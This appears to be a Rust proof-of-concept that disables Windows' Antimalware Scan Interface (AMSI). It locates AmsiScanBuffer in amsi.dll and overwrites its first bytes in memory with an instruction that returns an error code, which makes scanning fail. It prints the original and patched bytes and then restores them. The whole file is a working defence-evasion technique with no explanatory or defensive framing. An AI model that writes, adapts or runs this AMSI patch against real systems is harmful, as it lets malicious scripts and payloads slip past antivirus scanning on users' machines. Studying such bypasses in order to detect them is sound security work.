use std::os::raw::c_void;

use windows_sys::Win32::System::{
    Diagnostics::Debug::WriteProcessMemory,
    LibraryLoader::{GetProcAddress, LoadLibraryA},
    Threading::GetCurrentProcess,
};

fn main() {
    unsafe {
        let amsi = LoadLibraryA("amsi.dll\0".as_ptr() as *const u8);

        if amsi.is_null() {
            println!("[-] Failed to load amsi.dll");
        }

        println!("[+] Amsi.dll loaded at {:p}", amsi);

        let amsi_scan_buffer =
            GetProcAddress(amsi, "AmsiScanBuffer\0".as_ptr() as *const u8).unwrap() as *mut c_void;

        if amsi_scan_buffer.is_null() {
            println!("[-] Failed to get address for AmsiScanBuffer\n")
        }

        println!("[+] AmsiScanBuffer address: {:p}", amsi_scan_buffer);

        println!("[!] Original Bytes: ");

        let mut org_bytes: Vec<u8> = Vec::new();
        print!("\t");
        for i in 0..10 {
            org_bytes.push(*(amsi_scan_buffer.offset(i) as *const u8));
            let byte = *(amsi_scan_buffer.offset(i) as *const u8);
            print!("{:02X} ", byte);
        }
        print!("\n");

        let patch: [u8; 6] = [
            0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
            0xC3, // ret
        ];

        let mut bytes_written: usize = 0;
        if !WriteProcessMemory(
            GetCurrentProcess(),
            amsi_scan_buffer,
            patch.as_ptr() as _,
            patch.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to patch bytes!");
        }

        println!("[+] Successfully patched AmsiScanBuffer!");

        println!("[!] Patched Bytes: ");
        print!("\t");
        for i in 0..10 {
            let byte = *(amsi_scan_buffer.offset(i) as *const u8);
            print!("{:02X} ", byte);
        }
        print!("\n");

        println!("[+] Restoring original bytes...");

        let mut bytes_written: usize = 0;
        if !WriteProcessMemory(
            GetCurrentProcess(),
            amsi_scan_buffer,
            org_bytes.as_ptr() as _,
            org_bytes.len(),
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to restore original bytes!");
        }

        println!("[!] Restored Bytes: ");
        print!("\t");
        for i in 0..10 {
            let byte = *(amsi_scan_buffer.offset(i) as *const u8);
            print!("{:02X} ", byte);
        }
    }
}
